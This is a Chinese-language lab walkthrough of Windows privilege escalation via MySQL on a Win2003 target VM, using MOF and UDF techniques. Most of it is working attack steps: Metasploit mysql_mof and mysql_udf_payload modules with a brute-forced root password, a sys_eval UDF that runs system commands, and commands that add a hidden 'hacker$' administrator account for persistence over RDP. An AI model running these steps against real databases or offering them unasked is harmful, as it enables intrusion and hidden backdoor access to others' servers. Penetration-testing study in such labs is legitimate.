# Windows提权-MySQL提权

**0x00 环境靶场**

|          | 靶机           | 攻击机         |
| -------- | -------------- | -------------- |
| 操作系统 | Win2003        | kali           |
| IP地址   | 192.168.12.139 | 192.168.12.135 |
| 开放端口 | 80，3306，3389 |                |

**0x01 MOF提权**

Managed Object Format，

1、获取数据库密码

```
# 爆破mysql数据库密码，结果为：root	qazwsx123
```

2、获取shell并提权

```shell
msfconsole

search mof

use exploit/windows/mysql/mysql_mof

set password qazwsx123

set username root

set rhost 192.168.12.139

run

```

3、权限维持

```shell
# 创建用户
net user hacker$ password /add

net localgroup administrators hacker$ /add

# 远程连接--需要开启远程桌面
rdesktop 192.168.12.139:3389

```

**0x02 UDF提权**

user defined function ，用户自定义文件函数

1、获取数据库密码

```mysql
# 爆破mysql数据库密码，结果为：root	qazwsx123
# 使用Navicat连接

show variables like '%priv%'        # 确定Mysql的写文件的权限，拥有任意路径的写权限
show variables like '%plugin%'        # 确定Mysql的插件目录，并由此推断HTTP的主目录
C:\PHPnow\MySQL-5.1.50\lib/plugin


select * from mysql.func where name = "sys_exec";    # 确认系统中并不存在sys_exec的函数，需要使用UDF自行定义
```

2、获取shell并提权

```shell
msfconsole

search udf

use exploit/multi/mysql/mysql_udf_payload

set rhost 192.168.12.139

set password qazwsx123

set username root

run
```

![image-20230301201105978](https://s2.loli.net/2023/03/09/5kmVAjRhXnuTHWP.png)

```shell
# 上传成功后，Navicat查看func表
# 创建用户自定义函数
create function sys_eval returns string soname "vXtkbOaz.dll";
```

![image-20230301201359690](https://s2.loli.net/2023/03/09/3yUivH8jBnDzMRK.png)

3、权限维持

```shell
# 利用函数执行命令
select sys_eval("ipconfig");
select sys_eval("whoami"); 

select sys_eval("net user hacker$ password /add"); 
select sys_eval("net localgroup administrators hacker$ /add"); 
```

